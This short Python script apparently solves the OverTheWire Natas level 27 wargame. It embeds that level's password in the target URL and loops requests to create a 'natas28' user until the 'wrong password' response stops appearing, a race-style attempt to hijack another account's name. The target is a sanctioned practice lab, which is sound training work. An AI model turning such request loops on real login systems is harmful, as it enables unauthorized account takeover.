import requests
import time

target = 'http://natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ@natas27.natas.labs.overthewire.org/'

wrongresp = 'Wrong password for user'
okresp = 'was created!'

count = 0
while True:
	count += 1
	print(str(count)+' attempt')

	r = requests.get(target+'?username=natas28&password=godknowswhat')
	
	if r.content.find(wrongresp) != -1:
		print('fail')
		continue
	else:
		print(r.content)
		break

finr = requests.get(target+'?username=natas28&password=godknowswhat')

print(finr.content)
